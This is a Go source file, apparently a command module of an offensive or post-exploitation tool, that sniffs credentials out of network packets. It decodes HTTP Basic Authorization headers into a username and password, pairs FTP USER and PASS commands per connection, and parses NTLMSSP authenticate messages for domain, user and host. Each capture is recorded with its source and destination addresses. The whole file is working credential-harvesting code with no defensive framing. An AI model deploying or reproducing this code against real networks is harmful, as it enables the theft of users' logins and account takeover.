package commands

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
)

// HTTP Basic Auth extraction
func sniffExtractHTTPBasicAuth(payload []byte, meta *packetMeta) *sniffCredential {
	s := string(payload)
	if len(s) < 4 {
		return nil
	}
	if s[0] != 'G' && s[0] != 'P' && s[0] != 'H' && s[0] != 'D' && s[0] != 'O' {
		return nil
	}

	idx := strings.Index(strings.ToLower(s), "authorization: basic ")
	if idx < 0 {
		return nil
	}

	start := idx + len("authorization: basic ")
	rest := s[start:]
	end := strings.Index(rest, "\r\n")
	if end < 0 {
		end = len(rest)
	}
	encoded := strings.TrimSpace(rest[:end])

	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		decoded, err = base64.RawStdEncoding.DecodeString(encoded)
		if err != nil {
			return nil
		}
	}

	parts := strings.SplitN(string(decoded), ":", 2)
	if len(parts) != 2 {
		return nil
	}

	return &sniffCredential{
		Protocol:  "http-basic",
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  parts[0],
		Password:  parts[1],
		Timestamp: time.Now().Unix(),
	}
}

// FTP credential tracking
type sniffFTPTracker struct {
	mu      sync.Mutex
	pending map[string]string
}

func (ft *sniffFTPTracker) process(payload []byte, meta *packetMeta) *sniffCredential {
	s := strings.TrimSpace(string(payload))
	if len(s) == 0 || len(s) > 512 {
		return nil
	}

	key := fmt.Sprintf("%s:%d->%s:%d", meta.SrcIP, meta.SrcPort, meta.DstIP, meta.DstPort)
	upper := strings.ToUpper(s)

	ft.mu.Lock()
	defer ft.mu.Unlock()

	if strings.HasPrefix(upper, "USER ") {
		username := strings.TrimSpace(s[5:])
		if username != "" && username != "anonymous" {
			ft.pending[key] = username
		}
		return nil
	}

	if strings.HasPrefix(upper, "PASS ") {
		password := strings.TrimSpace(s[5:])
		if username, ok := ft.pending[key]; ok {
			delete(ft.pending, key)
			return &sniffCredential{
				Protocol:  "ftp",
				SrcIP:     meta.SrcIP,
				SrcPort:   meta.SrcPort,
				DstIP:     meta.DstIP,
				DstPort:   meta.DstPort,
				Username:  username,
				Password:  password,
				Timestamp: time.Now().Unix(),
			}
		}
	}

	return nil
}

// NTLM detection
var sniffNTLMSig = []byte("NTLMSSP\x00")

func sniffExtractNTLM(payload []byte, meta *packetMeta) *sniffCredential {
	idx := bytes.Index(payload, sniffNTLMSig)
	if idx < 0 {
		return nil
	}

	data := payload[idx:]
	if len(data) < 72 {
		return nil
	}

	msgType := binary.LittleEndian.Uint32(data[8:12])
	if msgType != 3 {
		return nil
	}

	readField := func(lenOff, offOff int) string {
		if len(data) < offOff+4 {
			return ""
		}
		fLen := binary.LittleEndian.Uint16(data[lenOff : lenOff+2])
		fOff := binary.LittleEndian.Uint32(data[offOff : offOff+4])
		end := uint32(fLen) + fOff
		if fLen == 0 || end > uint32(len(data)) {
			return ""
		}
		return sniffDecodeUTF16LE(data[fOff:end])
	}

	domain := readField(28, 32)
	user := readField(36, 40)
	host := readField(44, 48)

	if user == "" {
		return nil
	}

	username := user
	if domain != "" {
		username = domain + "\\" + user
	}

	return &sniffCredential{
		Protocol:  "ntlm",
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  username,
		Detail:    fmt.Sprintf("host=%s", host),
		Timestamp: time.Now().Unix(),
	}
}

func sniffDecodeUTF16LE(b []byte) string {
	if len(b) < 2 || len(b)%2 != 0 {
		return ""
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	return string(utf16.Decode(u16))
}
